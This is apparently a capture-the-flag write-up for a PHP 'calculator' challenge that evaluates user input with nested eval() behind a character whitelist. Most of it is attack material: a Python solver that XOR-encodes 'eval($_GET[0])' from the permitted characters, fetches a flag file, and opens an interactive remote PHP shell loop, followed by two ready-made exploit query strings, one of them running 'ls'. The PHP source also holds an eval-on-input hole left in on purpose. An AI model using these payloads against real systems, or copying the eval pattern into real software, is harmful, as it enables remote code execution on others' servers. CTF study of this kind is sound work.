```php
<!-- Enjoy Tsu's Super Calculator <3, Not Only + - * / but also many other operators <3 <3 <3 -->

<?php

ini_set("display_errors", 0);

if(!isset($_GET["calc"])) 
{
    show_source(__FILE__);
}
else
{
    $wl = preg_match('/^[0-9\+\-\*\/\(\)\'\.\~\^\|\&]+$/i', $_GET["calc"]);
    if($wl === 0 || strlen($_GET["calc"]) > 70) {
        die("Tired of calculating? Lets <a href='https://www.youtube.com/watch?v=wDe_aCyf4aE' target=_blank >relax</a> <3");
    }
    echo 'Result: ';
    eval("echo ".eval("return ".$_GET["calc"].";").";");
}
```
X^Y=Z
X^Z=Y
Y^X=Z
SOLUTION BY : (Alexander Tarasov 'oioki') thanks got link from discord :)

```python

import urllib.parse,requests, sys

combo = "0123456789+-*/().~^|&"

def find_combination(char_target):
    for x in combo:
        for y in combo:
            for z in combo:
                char = ord(x) ^ ord(y) ^ ord(z)
                if char == ord(char_target):
                    return (x, y, z)
    return False


SHELL = 'eval($_GET[0])'

s1 = ''
s2 = ''
s3 = ''

for a in SHELL:
    c1, c2, c3 = find_combination(a)
    s1 += c1
    s2 += c2
    s3 += c3

shellcode = "'{}'^'{}'^'{}'".format(s1, s2, s3)

print("Shellcode length:", len(shellcode))
print("Shellcode:", shellcode)


#cmd = 'var_dump(scandir("."));'
cmd = 'var_dump(file_get_contents("fl4g1sH3re.php"));'

while True:
    payload = urllib.parse.quote_plus(shellcode) + '&0=' + cmd
    print(payload)

    url = BASE_URL + payload
    print(url)

    r = requests.get(url)
    print(r.text)

    cmd = input('php > ')
```

Exploit : `'+99999+'^'5|~|+95'^'~&&12*~'`

Exploit : `?0=ls&calc=(')00'^'521'^'|%26^').('99*'^'~|~').('^0^)'^'0005'^'503|')`
